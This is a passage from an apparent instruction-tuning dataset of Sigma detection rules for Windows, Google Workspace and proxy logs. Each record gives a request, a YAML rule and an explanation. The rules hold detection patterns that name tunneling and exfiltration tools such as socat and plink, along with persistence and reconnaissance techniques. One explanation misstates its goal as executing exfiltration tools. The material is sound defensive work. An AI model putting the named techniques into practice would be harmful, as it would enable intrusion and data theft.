    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains:\n            - 'create'\n            - 'config'\n        CommandLine|contains|all:\n            - 'binPath'\n            - 'type'\n            - 'kernel'\n    condition: selection\nfalsepositives:\n    - Rare legitimate installation of kernel drivers via sc.exe\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains:\n            - 'create'\n            - 'config'\n        CommandLine|contains|all:\n            - 'binPath'\n            - 'type'\n            - 'kernel'\n    condition: selection\nfalsepositives:\n    - Rare legitimate installation of kernel drivers via sc.exe\nlevel: medium\n",
      "question": "creation of a new service (kernel driver) with the type \"kernel\"",
      "answer": "In order to detect the creation of a new service (kernel driver) with the type \"kernel\", you should: Look for the creation of processes on Windows systems where the process is ending with '\\sc.exe', indicating the Service Control Manager is used. The command line arguments should include 'create' or 'config', pointing towards the creation or configuration of a service, and must include 'binPath', 'type', and 'kernel' all together. These conditions suggest an attempt to install a kernel driver, which is a powerful mechanism that can be abused by attackers to execute code at a low level within the operating system. Note that there may be rare legitimate instances of installing kernel drivers via sc.exe, but generally, this activity should be scrutinized. The focus is mainly on monitoring process creation logs to catch such potentially malicious behavior."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Execution of well known tools for data exfiltration and tunneling.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to execute well-known tools for data exfiltration and tunneling, you should: monitor the creation of processes on Windows systems for instances where the names of the executable files end with '\\plink.exe', '\\socat.exe', '\\stunnel.exe', or '\\httptunnel.exe'. These executables are commonly associated with tunneling and data exfiltration activities, potentially indicating a security breach or malicious activity within the network. Keep in mind that there could be legitimate use cases where administrators are utilizing these tools, which are flagged as false positives. This monitoring activity is of medium importance due to its potential for detecting unauthorized data movement or covert communication channels established by an adversary leveraging these tools.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\plink.exe'\n            - '\\socat.exe'\n            - '\\stunnel.exe'\n            - '\\httptunnel.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tools\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\plink.exe'\n            - '\\socat.exe'\n            - '\\stunnel.exe'\n            - '\\httptunnel.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tools\nlevel: medium\n",
      "question": "Execution of well known tools for data exfiltration and tunneling",
      "answer": "In order to execute well-known tools for data exfiltration and tunneling, you should: monitor the creation of processes on Windows systems for instances where the names of the executable files end with '\\plink.exe', '\\socat.exe', '\\stunnel.exe', or '\\httptunnel.exe'. These executables are commonly associated with tunneling and data exfiltration activities, potentially indicating a security breach or malicious activity within the network. Keep in mind that there could be legitimate use cases where administrators are utilizing these tools, which are flagged as false positives. This monitoring activity is of medium importance due to its potential for detecting unauthorized data movement or covert communication channels established by an adversary leveraging these tools."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious reconnaissance command line activity on Windows systems using the PowerShell Get-LocalGroupMember Cmdlet.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious reconnaissance command line activity on Windows systems using the PowerShell Get-LocalGroupMember Cmdlet, you should monitor Windows process creation logs for the execution of commands that contain 'Get-LocalGroupMember '. Furthermore, be on the lookout for specific references within those commands to key user groups such as 'domain admins', both correctly spelled and with common typos like ' administrator' without an 's', ' administrateur' again missing an 's', 'enterprise admins', 'Exchange Trusted Subsystem', 'Remote Desktop Users', and the translations of 'Remote Desktop Users' in French as 'Utilisateurs du Bureau \u00e0 distance' and in Spanish as 'Usuarios de escritorio remoto'. It's important to capture both the command lines used and their parent command lines to fully understand the context of these potentially reconnaissance-related activities. However, be aware that legitimate administrative activity might occasionally use these commands, which could lead to false positives. The significance level of this detection is considered medium, indicating it's important but not necessarily indicative of a breach on its own.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Covers group and localgroup flags\n    selection_cmdlet:\n        CommandLine|contains: 'Get-LocalGroupMember '\n    selection_group:\n        CommandLine|contains:\n            # Add more groups for other languages\n            - 'domain admins'\n            - ' administrator' # Typo without an 'S' so we catch both\n            - ' administrateur' # Typo without an 'S' so we catch both\n            - 'enterprise admins'\n            - 'Exchange Trusted Subsystem'\n            - 'Remote Desktop Users'\n            - 'Utilisateurs du Bureau \u00e0 distance' # French for \"Remote Desktop Users\"\n            - 'Usuarios de escritorio remoto' # Spanish for \"Remote Desktop Users\"\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Covers group and localgroup flags\n    selection_cmdlet:\n        CommandLine|contains: 'Get-LocalGroupMember '\n    selection_group:\n        CommandLine|contains:\n            # Add more groups for other languages\n            - 'domain admins'\n            - ' administrator' # Typo without an 'S' so we catch both\n            - ' administrateur' # Typo without an 'S' so we catch both\n            - 'enterprise admins'\n            - 'Exchange Trusted Subsystem'\n            - 'Remote Desktop Users'\n            - 'Utilisateurs du Bureau \u00e0 distance' # French for \"Remote Desktop Users\"\n            - 'Usuarios de escritorio remoto' # Spanish for \"Remote Desktop Users\"\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: medium\n",
      "question": "suspicious reconnaissance command line activity on Windows systems using the PowerShell Get-LocalGroupMember Cmdlet",
      "answer": "In order to detect suspicious reconnaissance command line activity on Windows systems using the PowerShell Get-LocalGroupMember Cmdlet, you should monitor Windows process creation logs for the execution of commands that contain 'Get-LocalGroupMember '. Furthermore, be on the lookout for specific references within those commands to key user groups such as 'domain admins', both correctly spelled and with common typos like ' administrator' without an 's', ' administrateur' again missing an 's', 'enterprise admins', 'Exchange Trusted Subsystem', 'Remote Desktop Users', and the translations of 'Remote Desktop Users' in French as 'Utilisateurs du Bureau \u00e0 distance' and in Spanish as 'Usuarios de escritorio remoto'. It's important to capture both the command lines used and their parent command lines to fully understand the context of these potentially reconnaissance-related activities. However, be aware that legitimate administrative activity might occasionally use these commands, which could lead to false positives. The significance level of this detection is considered medium, indicating it's important but not necessarily indicative of a breach on its own."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting abuse of custom file open handler, executing powershell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the abuse of custom file open handler, executing PowerShell, you should: Focus on monitoring Windows registry settings modifications. Specifically, watch for any changes to registry entries associated with file open commands (`shell\\open\\command\\`). These entries, when altered, might be leveraged by attackers to execute arbitrary PowerShell commands. A key indicator of such malicious activity includes modifications where both 'powershell' and '-command' strings are present in the details of the registry setting change, under the event type 'SetValue'. It's important to pay attention to these signs as they represent a high-level threat. Though there may be instances where these modifications don't signify malicious activity (unknown false positives), vigilance in tracking these specific alterations in registry settings is crucial for identifying potential abuse of file handlers to execute unauthorized PowerShell commands.\n\n",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains: 'shell\\open\\command\\'\n        Details|contains|all:\n            - 'powershell'\n            - '-command'\n        EventType: SetValue\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains: 'shell\\open\\command\\'\n        Details|contains|all:\n            - 'powershell'\n            - '-command'\n        EventType: SetValue\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "abuse of custom file open handler, executing powershell",
      "answer": "In order to detect the abuse of custom file open handler, executing PowerShell, you should: Focus on monitoring Windows registry settings modifications. Specifically, watch for any changes to registry entries associated with file open commands (`shell\\open\\command\\`). These entries, when altered, might be leveraged by attackers to execute arbitrary PowerShell commands. A key indicator of such malicious activity includes modifications where both 'powershell' and '-command' strings are present in the details of the registry setting change, under the event type 'SetValue'. It's important to pay attention to these signs as they represent a high-level threat. Though there may be instances where these modifications don't signify malicious activity (unknown false positives), vigilance in tracking these specific alterations in registry settings is crucial for identifying potential abuse of file handlers to execute unauthorized PowerShell commands.\n\n"
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with highest privileges and not only the privileges of the login user account (e.g. the administrator account).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with the highest privileges and not only the privileges of the login user account (e.g., the administrator account), you should: Monitor Windows process creation logs for instances where the PSEXESVC.exe file is the parent image. Pay special attention if the process is initiated by user accounts that contain \"AUTHORI\" or \"AUTORI\" in their names, as this is often indicative of the command being executed under the context of an authority or administrator account, potentially in a different language setting. Be aware that there may be legitimate uses of this service for debugging purposes, particularly with Microsoft Intune, and such instances should be considered when evaluating potential false positives. This is a critical measure for identifying signs of remote command execution attempts that leverage high privileges on the target system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: 'C:\\Windows\\PSEXESVC.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection\nfalsepositives:\n    - Users that debug Microsoft Intune issues using the commands mentioned in the official documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: 'C:\\Windows\\PSEXESVC.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection\nfalsepositives:\n    - Users that debug Microsoft Intune issues using the commands mentioned in the official documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\nlevel: high\n",
      "question": "suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with highest privileges and not only the privileges of the login user account (e.g. the administrator account)",
      "answer": "In order to detect suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with the highest privileges and not only the privileges of the login user account (e.g., the administrator account), you should: Monitor Windows process creation logs for instances where the PSEXESVC.exe file is the parent image. Pay special attention if the process is initiated by user accounts that contain \"AUTHORI\" or \"AUTORI\" in their names, as this is often indicative of the command being executed under the context of an authority or administrator account, potentially in a different language setting. Be aware that there may be legitimate uses of this service for debugging purposes, particularly with Microsoft Intune, and such instances should be considered when evaluating potential false positives. This is a critical measure for identifying signs of remote command execution attempts that leverage high privileges on the target system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an Google Workspace user is granted admin privileges..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a Google Workspace user is granted admin privileges, you should monitor Google Workspace admin logs for events that indicate the granting of delegated admin privileges or admin privileges directly. This involves checking the logs from the Google Workspace Admin service, specifically focusing on events named GRANT_DELEGATED_ADMIN_PRIVILEGES and GRANT_ADMIN_PRIVILEGE. These events are crucial as they signify that a user's privileges have been elevated to an administrative level, potentially indicating an unauthorized attempt to gain elevated access within the organization's Google Workspace environment. It is important to note that there can be legitimate changes in admin role privileges by system administrators; hence these should be considered while evaluating potential security incidents. This detection strategy is rated with a medium level of urgency due to the significant impact that unauthorized admin access can have, yet it acknowledges the possibility of legitimate administrative actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: google_workspace\n    service: google_workspace.admin\ndetection:\n    selection:\n        eventService: admin.googleapis.com\n        eventName:\n            - GRANT_DELEGATED_ADMIN_PRIVILEGES\n            - GRANT_ADMIN_PRIVILEGE\n    condition: selection\nfalsepositives:\n    - Google Workspace admin role privileges, may be modified by system administrators.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: google_workspace\n    service: google_workspace.admin\ndetection:\n    selection:\n        eventService: admin.googleapis.com\n        eventName:\n            - GRANT_DELEGATED_ADMIN_PRIVILEGES\n            - GRANT_ADMIN_PRIVILEGE\n    condition: selection\nfalsepositives:\n    - Google Workspace admin role privileges, may be modified by system administrators.\nlevel: medium\n",
      "question": "when an Google Workspace user is granted admin privileges.",
      "answer": "In order to detect when a Google Workspace user is granted admin privileges, you should monitor Google Workspace admin logs for events that indicate the granting of delegated admin privileges or admin privileges directly. This involves checking the logs from the Google Workspace Admin service, specifically focusing on events named GRANT_DELEGATED_ADMIN_PRIVILEGES and GRANT_ADMIN_PRIVILEGE. These events are crucial as they signify that a user's privileges have been elevated to an administrative level, potentially indicating an unauthorized attempt to gain elevated access within the organization's Google Workspace environment. It is important to note that there can be legitimate changes in admin role privileges by system administrators; hence these should be considered while evaluating potential security incidents. This detection strategy is rated with a medium level of urgency due to the significant impact that unauthorized admin access can have, yet it acknowledges the possibility of legitimate administrative actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\nBrowser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\ninternal network resources such as servers, tools/dashboards, or other related infrastructure.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries attempting to enumerate browser bookmarks to learn more about compromised hosts, which can reveal personal information about users or details about internal network resources, you should monitor Windows PowerShell script activities, specifically looking for the use of the `Get-ChildItem` cmdlet with a combination of parameters. These parameters include `-Recurse`, which allows the script to search through directories recursively; `-Path`, which specifies the directory path to search; `-Filter Bookmarks`, indicating the search specifically targets bookmark files; `-ErrorAction SilentlyContinue`, which suppresses error messages; and `-Force`, enabling the script to perform actions that it would otherwise not be allowed to, such as accessing hidden or system files. This monitoring requires that Script Block Logging be enabled on the Windows system, to ensure that detailed records of PowerShell script executions are kept. The detection of this particular pattern of script execution is associated with a low level of alert due to the potential for false positives, as there may be legitimate reasons for scripts to access bookmarks in this manner.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Get-ChildItem'\n            - ' -Recurse '\n            - ' -Path '\n            - ' -Filter Bookmarks'\n            - ' -ErrorAction SilentlyContinue'\n            - ' -Force'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Get-ChildItem'\n            - ' -Recurse '\n            - ' -Path '\n            - ' -Filter Bookmarks'\n            - ' -ErrorAction SilentlyContinue'\n            - ' -Force'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\nBrowser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\ninternal network resources such as servers, tools/dashboards, or other related infrastructure.\n",
      "answer": "In order to detect adversaries attempting to enumerate browser bookmarks to learn more about compromised hosts, which can reveal personal information about users or details about internal network resources, you should monitor Windows PowerShell script activities, specifically looking for the use of the `Get-ChildItem` cmdlet with a combination of parameters. These parameters include `-Recurse`, which allows the script to search through directories recursively; `-Path`, which specifies the directory path to search; `-Filter Bookmarks`, indicating the search specifically targets bookmark files; `-ErrorAction SilentlyContinue`, which suppresses error messages; and `-Force`, enabling the script to perform actions that it would otherwise not be allowed to, such as accessing hidden or system files. This monitoring requires that Script Block Logging be enabled on the Windows system, to ensure that detailed records of PowerShell script executions are kept. The detection of this particular pattern of script execution is associated with a low level of alert due to the potential for false positives, as there may be legitimate reasons for scripts to access bookmarks in this manner."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group, you should: Monitor Windows process creation logs for occurrences where the process is `schtasks.exe`, which is indicative of task scheduling operations. Specifically, focus on command lines that include attempts to either delete (`/delete`) or change (`/change`) scheduled tasks, with a mandatory condition that these commands also specifically target the `\\Microsoft\\Windows\\Defrag\\ScheduledDefrag` task by using `/TN` (which specifies the task name). This detection points to the malicious tampering with scheduled defragmentation, a behavior observed in attacks attributed to the Slingshot APT group. Note that while this behavior is suspicious, there can be unknown legitimate reasons (false positives) for these operations, so it's classified with a medium level of severity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains:\n            - '/delete'\n            - '/change'\n        CommandLine|contains|all:\n            - '/TN'\n            - '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains:\n            - '/delete'\n            - '/change'\n        CommandLine|contains|all:\n            - '/TN'\n            - '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group",
      "answer": "In order to detect the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group, you should: Monitor Windows process creation logs for occurrences where the process is `schtasks.exe`, which is indicative of task scheduling operations. Specifically, focus on command lines that include attempts to either delete (`/delete`) or change (`/change`) scheduled tasks, with a mandatory condition that these commands also specifically target the `\\Microsoft\\Windows\\Defrag\\ScheduledDefrag` task by using `/TN` (which specifies the task name). This detection points to the malicious tampering with scheduled defragmentation, a behavior observed in attacks attributed to the Slingshot APT group. Note that while this behavior is suspicious, there can be unknown legitimate reasons (false positives) for these operations, so it's classified with a medium level of severity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential malicious modification of run keys by winekey or team9 backdoor.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential malicious modification of run keys by winekey or team9 backdoor, you should: Monitor registry event logs in Windows systems for any modifications targeting object paths that end with 'Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr'. This focus is critical as attackers commonly manipulate registry run keys to achieve persistence by ensuring their malware or backdoor programs launch automatically at system startup. When such an activity is identified, it is pertinent to examine the associated computer name, the image involved in the modification, the type of event that occurred, and the specific registry object targeted. Nonetheless, it's important to acknowledge that there might be instances deemed as false positives due to unidentified reasons; hence, a high level of caution and verification is recommended in the analysis process to ascertain the legitimacy of the registry modifications observed.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        TargetObject|endswith: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr'\n    condition: selection\nfields:\n    - ComputerName\n    - Image\n    - EventType\n    - TargetObject\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        TargetObject|endswith: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr'\n    condition: selection\nfields:\n    - ComputerName\n    - Image\n    - EventType\n    - TargetObject\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential malicious modification of run keys by winekey or team9 backdoor",
      "answer": "In order to detect potential malicious modification of run keys by winekey or team9 backdoor, you should: Monitor registry event logs in Windows systems for any modifications targeting object paths that end with 'Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr'. This focus is critical as attackers commonly manipulate registry run keys to achieve persistence by ensuring their malware or backdoor programs launch automatically at system startup. When such an activity is identified, it is pertinent to examine the associated computer name, the image involved in the modification, the type of event that occurred, and the specific registry object targeted. Nonetheless, it's important to acknowledge that there might be instances deemed as false positives due to unidentified reasons; hence, a high level of caution and verification is recommended in the analysis process to ascertain the legitimacy of the registry modifications observed."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting downloads from PwnDrp web servers developed for red team testing and most likely also used for criminal activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect downloads from PwnDrp web servers developed for red team testing and most likely also used for criminal activity, you should: focus on monitoring proxy logs for any traffic containing the specific string '/pwndrop/' in the URI. This indicates a client accessing resources associated with PwnDrp web servers, which are often utilized for cybersecurity testing but may also be employed for malicious purposes. To effectively implement this detection, focus on analyzing the client IP address, the request URI (c-uri), and the client user agent (c-useragent) within the proxy logs. It's important to note, however, that there might be instances where valid detection could yield false positives, although such occurrences are not specifically known. Given the critical nature of detecting potential criminal activity or unauthorized red team testing, the level of attention to such communications should be elevated.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri|contains: '/pwndrop/'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri|contains: '/pwndrop/'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "downloads from PwnDrp web servers developed for red team testing and most likely also used for criminal activity",
      "answer": "In order to detect downloads from PwnDrp web servers developed for red team testing and most likely also used for criminal activity, you should: focus on monitoring proxy logs for any traffic containing the specific string '/pwndrop/' in the URI. This indicates a client accessing resources associated with PwnDrp web servers, which are often utilized for cybersecurity testing but may also be employed for malicious purposes. To effectively implement this detection, focus on analyzing the client IP address, the request URI (c-uri), and the client user agent (c-useragent) within the proxy logs. It's important to note, however, that there might be instances where valid detection could yield false positives, although such occurrences are not specifically known. Given the critical nature of detecting potential criminal activity or unauthorized red team testing, the level of attention to such communications should be elevated."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential COM object hijacking leveraging the COM Search Order.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential COM object hijacking leveraging the COM Search Order, you should focus on monitoring registry set actions within the Windows environment, specifically targeting new COM server entries being established in the user's hive. This entails looking for registry operations where the EventType is \"SetValue\" and the TargetObject begins with either 'HKCR\\CLSID\\' or 'HKCU\\Software\\Classes\\CLSID\\'. Moreover, it is crucial that these operations are ending with '\\InprocServer32\\(Default)' to pinpoint the exact nature of the potential hijacking attempt.\n\nTo refine detection accuracy and minimize false positives, a range of filters should be applied to exclude operations related to standard or benign activities. These filters include but are not limited to excluding operations that contain references to system directories like '%%systemroot%%\\system32\\' and '%%systemroot%%\\SysWow64\\', which are common places for legitimate software operations. Similarly, activities related to frequently used applications such as OneDrive, Microsoft Teams, Dropbox, and Nvidia, among others, necessitate exclusions based on specific paths or files associated with these applications. Exclusions also cover updates and processes from Windows Defender, Edge browser activities, and other system utilities like DirectX diagnostics or Python shell extensions, to name a few.\n\nMoreover, it's imperative to consider that some installed utilities, like OneDrive, might legitimately register new COM objects at the user level, which could be flagged as false positives. Thus, while maintaining vigilance for COM object hijacking attempts, it\u2019s crucial to balance sensitivity to potential threats with the understanding of normal system and application behaviors. The overarching goal is to safeguard against malicious COM object registrations that could be exploited for hijacking, while allowing legitimate registry modifications associated with routine software installation and system updates. This approach is informed by identifying misuse of the COM search order to subvert system processes or applications by registering malicious COM objects, a tactic often utilized in persistence, privilege escalation, or other malicious endeavors.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection: # Detect new COM servers in the user hive\n        EventType: SetValue\n        TargetObject|startswith:\n            - 'HKCR\\CLSID\\'\n            - 'HKCU\\Software\\Classes\\CLSID\\'\n        TargetObject|endswith: '\\InprocServer32\\(Default)'\n    filter_generic:\n        Details|contains: # Exclude privileged directories and observed FPs\n            - '%%systemroot%%\\system32\\'\n            - '%%systemroot%%\\SysWow64\\'\n    filter_onedrive:\n        Details|contains:\n            # Related To OneDrive\n            - '\\AppData\\Local\\Microsoft\\OneDrive\\'\n            - '\\FileCoAuthLib64.dll'\n            - '\\FileSyncShell64.dll'\n            - '\\FileSyncApi64.dll'\n    filter_health_service:\n        Image: 'C:\\WINDOWS\\system32\\SecurityHealthService.exe'\n    filter_teams:\n        Details|contains|all:\n            - '\\AppData\\Local\\Microsoft\\TeamsMeetingAddin\\'\n            - '\\Microsoft.Teams.AddinLoader.dll'\n    filter_dropbox:\n        Details|contains|all:\n            - '\\AppData\\Roaming\\Dropbox\\'\n            - '\\DropboxExt64.*.dll'\n    filter_trend_micro:\n        Details|endswith: 'TmopIEPlg.dll' #TrendMicro osce\n    filter_update:\n        Image:\n            - 'C:\\WINDOWS\\system32\\wuauclt.exe'\n            - 'C:\\WINDOWS\\system32\\svchost.exe'\n    filter_defender:\n        Image|startswith:\n            - 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n            - 'C:\\Program Files\\Windows Defender\\'\n        Image|endswith: '\\MsMpEng.exe'\n    filter_nvidia:\n        Details|contains: '\\FileRepository\\nvmdi.inf'\n    filter_edge:\n        Image|endswith: '\\MicrosoftEdgeUpdateComRegisterShell64.exe'\n    filter_dx:\n        Image: 'C:\\WINDOWS\\SYSTEM32\\dxdiag.exe'\n    filter_python:\n        Details:\n            - 'C:\\Windows\\pyshellext.amd64.dll'\n            - 'C:\\Windows\\pyshellext.dll'\n    filter_bonjourlib:\n        Details:\n            - 'C:\\Windows\\system32\\dnssdX.dll'\n            - 'C:\\Windows\\SysWOW64\\dnssdX.dll'\n    filter_printextensionmanager:\n        Details: 'C:\\Windows\\system32\\spool\\drivers\\x64\\3\\PrintConfig.dll'\n    filter_programfiles:\n        Details|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n    filter_programdata:\n        Details|startswith: 'C:\\ProgramData\\Microsoft\\'\n    filter_gameservice:\n        Details|contains: 'C:\\WINDOWS\\system32\\GamingServicesProxy.dll'\n    filter_poqexec:\n        Image: 'C:\\Windows\\System32\\poqexec.exe'\n        Details|contains: 'C:\\Windows\\System32\\Autopilot.dll'\n    filter_sec_health_svc:\n        Image: 'C:\\Windows\\system32\\SecurityHealthService.exe'\n        Details|contains: 'C:\\Windows\\System32\\SecurityHealth'\n    filter_inprocserver:\n        Image:\n            - 'C:\\Windows\\System32\\poqexec.exe'\n            - 'C:\\Windows\\System32\\regsvr32.exe'\n        TargetObject|endswith: '\\InProcServer32\\(Default)'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Some installed utilities (i.e. OneDrive) may serve new COM objects at user-level\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection: # Detect new COM servers in the user hive\n        EventType: SetValue\n        TargetObject|startswith:\n            - 'HKCR\\CLSID\\'\n            - 'HKCU\\Software\\Classes\\CLSID\\'\n        TargetObject|endswith: '\\InprocServer32\\(Default)'\n    filter_generic:\n        Details|contains: # Exclude privileged directories and observed FPs\n            - '%%systemroot%%\\system32\\'\n            - '%%systemroot%%\\SysWow64\\'\n    filter_onedrive:\n        Details|contains:\n            # Related To OneDrive\n            - '\\AppData\\Local\\Microsoft\\OneDrive\\'\n            - '\\FileCoAuthLib64.dll'\n            - '\\FileSyncShell64.dll'\n            - '\\FileSyncApi64.dll'\n    filter_health_service:\n        Image: 'C:\\WINDOWS\\system32\\SecurityHealthService.exe'\n    filter_teams:\n        Details|contains|all:\n            - '\\AppData\\Local\\Microsoft\\TeamsMeetingAddin\\'\n            - '\\Microsoft.Teams.AddinLoader.dll'\n    filter_dropbox:\n        Details|contains|all:\n            - '\\AppData\\Roaming\\Dropbox\\'\n            - '\\DropboxExt64.*.dll'\n    filter_trend_micro:\n        Details|endswith: 'TmopIEPlg.dll' #TrendMicro osce\n    filter_update:\n        Image:\n            - 'C:\\WINDOWS\\system32\\wuauclt.exe'\n            - 'C:\\WINDOWS\\system32\\svchost.exe'\n    filter_defender:\n        Image|startswith:\n            - 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n            - 'C:\\Program Files\\Windows Defender\\'\n        Image|endswith: '\\MsMpEng.exe'\n    